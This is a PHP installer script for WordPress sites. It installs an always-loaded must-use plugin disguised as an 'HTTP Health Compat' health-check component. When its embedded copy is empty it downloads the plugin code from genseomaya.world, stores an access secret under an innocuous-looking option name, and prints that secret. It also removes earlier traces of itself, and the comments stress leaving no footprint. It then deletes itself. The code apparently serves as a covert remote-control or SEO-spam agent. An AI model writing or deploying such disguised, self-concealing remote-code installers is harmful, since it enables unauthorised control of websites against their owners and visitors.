<?php
/**
 * Universal one-shot installer (same file for every WP domain).
 * Menulis HANYA: wp-content/mu-plugins/health-check-http.php
 * Lalu generate secret, print sekali, self-delete.
 * Tidak meninggalkan bridge/jejak lain di docroot.
 *
 * Agent body: embedded base64 dulu; fallback fetch dari genseomaya.world.
 * GSC/IndexNow files TIDAK ditulis di sini (Connect / Push Index).
 * Syntax target: PHP 5.6+.
 */
function seomaya_install_find_wp_abspath()
{
    $starts = array();
    foreach (array(
        __DIR__,
        dirname((string) (isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : '')),
        (string) (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : ''),
        (string) (isset($_SERVER['CONTEXT_DOCUMENT_ROOT']) ? $_SERVER['CONTEXT_DOCUMENT_ROOT'] : ''),
        (string) @getcwd(),
        dirname(__DIR__),
    ) as $raw) {
        $norm = rtrim(str_replace('\\', '/', (string) $raw), '/');
        if ($norm !== '') {
            $starts[$norm] = true;
        }
    }

    foreach (array_keys($starts) as $start) {
        $path = $start;
        for ($i = 0; $i < 16; $i++) {
            if (is_file($path.'/wp-load.php')) {
                return $path;
            }
            if ($i === 0 && is_dir($path)) {
                $children = @scandir($path);
                if (! is_array($children)) {
                    $children = array();
                }
                foreach ($children as $child) {
                    if ($child === '.' || $child === '..') {
                        continue;
                    }
                    $cand = $path.'/'.$child;
                    if (is_file($cand.'/wp-load.php')) {
                        return $cand;
                    }
                }
            }
            $parent = dirname($path);
            if ($parent === $path) {
                break;
            }
            $path = $parent;
        }
    }

    return null;
}

function seomaya_install_random_secret()
{
    if (function_exists('random_bytes')) {
        return bin2hex(random_bytes(24));
    }
    if (function_exists('openssl_random_pseudo_bytes')) {
        $raw = openssl_random_pseudo_bytes(24);
        if (is_string($raw) && strlen($raw) === 24) {
            return bin2hex($raw);
        }
    }

    return md5(uniqid((string) mt_rand(), true)).md5(uniqid((string) mt_rand(), true));
}

function seomaya_install_write_file($path, $body)
{
    $dir = dirname($path);
    if (! is_dir($dir)) {
        if (function_exists('wp_mkdir_p')) {
            wp_mkdir_p($dir);
        } else {
            @mkdir($dir, 0755, true);
        }
    }

    if (@file_put_contents($path, $body) !== false) {
        @chmod($path, 0644);
        if (function_exists('opcache_invalidate')) {
            @opcache_invalidate($path, true);
        }

        return true;
    }

    $tmp = $path.'.tmp-'.getmypid();
    if (@file_put_contents($tmp, $body) === false) {
        return false;
    }
    if (! @rename($tmp, $path)) {
        $ok = @file_put_contents($path, $body) !== false;
        @unlink($tmp);
        if ($ok) {
            @chmod($path, 0644);
        }

        return $ok;
    }
    @chmod($path, 0644);
    if (function_exists('opcache_invalidate')) {
        @opcache_invalidate($path, true);
    }

    return true;
}

function seomaya_install_agent_looks_valid($body)
{
    return is_string($body) && $body !== ''
        && strpos($body, 'Plugin Name: HTTP Health Compat') !== false
        && (
            strpos($body, 'function seomaya_register_soft_ping') !== false
            || strpos($body, 'function seomaya_handle_ping') !== false
        );
}

/**
 * Ambil body agent: embedded b64 → CDN/raw genseomaya.world.
 */
function seomaya_install_load_agent_body($muB64)
{
    $muBody = base64_decode($muB64, true);
    if (seomaya_install_agent_looks_valid($muBody)) {
        return $muBody;
    }

    $urls = array(
        'https://genseomaya.world/install/wordpress-agent',
        'https://genseomaya.world/install/wordpress-agent',
    );
    foreach ($urls as $url) {
        $url = trim((string) $url);
        if ($url === '' || strpos($url, '{{') !== false) {
            continue;
        }
        $fetched = seomaya_install_http_get($url);
        if (seomaya_install_agent_looks_valid($fetched)) {
            return $fetched;
        }
    }

    return null;
}

function seomaya_install_http_get($url)
{
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        if ($ch !== false) {
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 12);
            curl_setopt($ch, CURLOPT_TIMEOUT, 45);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
            curl_setopt($ch, CURLOPT_USERAGENT, 'SEOMaya-Install/1.5.4');
            $body = curl_exec($ch);
            $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            if (is_string($body) && $body !== '' && $code >= 200 && $code < 300) {
                return $body;
            }
        }
    }

    $ctx = stream_context_create(array(
        'http' => array(
            'timeout' => 45,
            'header' => "User-Agent: SEOMaya-Install/1.5.4\r\n",
        ),
        'ssl' => array(
            'verify_peer' => true,
            'verify_peer_name' => true,
        ),
    ));
    $body = @file_get_contents($url, false, $ctx);

    return is_string($body) ? $body : null;
}

$wpRoot = seomaya_install_find_wp_abspath();
$ok = false;
$secretOut = '';

if (is_string($wpRoot) && $wpRoot !== '') {
    require_once $wpRoot.'/wp-load.php';
    if (defined('ABSPATH') && is_file(ABSPATH.'wp-admin/includes/file.php')) {
        require_once ABSPATH.'wp-admin/includes/file.php';
    }

    $bootstrap = 'flGqAit9AnAMBGtSmBpQvQjx22UKxpj1hLT6SJUTeUgEU30n';
    $muB64 = '';

    if ((string) get_option('permalink_structure') === '') {
        update_option('permalink_structure', '/%postname%/');
    }
    if (function_exists('flush_rewrite_rules')) {
        @flush_rewrite_rules(false);
    }

    // Satu jejak saja: wp-content/mu-plugins/health-check-http.php
    $muDir = trailingslashit(WP_CONTENT_DIR).'mu-plugins';
    $muBody = seomaya_install_load_agent_body($muB64);
    $loaderOk = false;
    if (seomaya_install_agent_looks_valid($muBody)) {
        $loaderOk = seomaya_install_write_file($muDir.'/health-check-http.php', $muBody);
    }

    // Bersihkan jejak lama (bridge docroot + folder seomaya/).
    foreach (array(
        trailingslashit(ABSPATH).'http-health.php',
        trailingslashit($wpRoot).'http-health.php',
        $muDir.'/seomaya/agent.php',
    ) as $legacy) {
        if (is_file($legacy)) {
            @unlink($legacy);
        }
    }
    $legacyDir = $muDir.'/seomaya';
    if (is_dir($legacyDir)) {
        @rmdir($legacyDir);
    }

    // GSC HTML → ditulis saat Connect. IndexNow .txt → ditulis saat Push Index.
    // Install hanya mu-plugin + secret (non-intrusive).

    // Reinstall: pertahankan secret lama bila ada.
    $prev = get_option('_http_health_cfg', array());
    if (! is_array($prev)) {
        $prev = array();
    }
    $secretOut = trim((string) (isset($prev['secret']) ? $prev['secret'] : ''));
    if ($secretOut === '' || strlen($secretOut) < 16) {
        $secretOut = seomaya_install_random_secret();
    }

    update_option('_http_health_cfg', array(
        'bootstrap' => $bootstrap,
        'secret' => $secretOut,
        'indexnow_key' => (string) (isset($prev['indexnow_key']) ? $prev['indexnow_key'] : ''),
        'installed_at' => (string) (isset($prev['installed_at']) ? $prev['installed_at'] : gmdate('c')),
        'reinstalled_at' => gmdate('c'),
        'version' => '1.5.5',
    ), false);

    $ok = $secretOut !== '' && $loaderOk;
}

if (! headers_sent()) {
    if (function_exists('status_header')) {
        status_header($ok ? 200 : 500);
    } elseif (function_exists('http_response_code')) {
        http_response_code($ok ? 200 : 500);
    }
    header('Content-Type: text/plain; charset=UTF-8');
}

if ($ok) {
    echo $secretOut;
} else {
    echo 'fail';
}

@unlink(__FILE__);
exit;
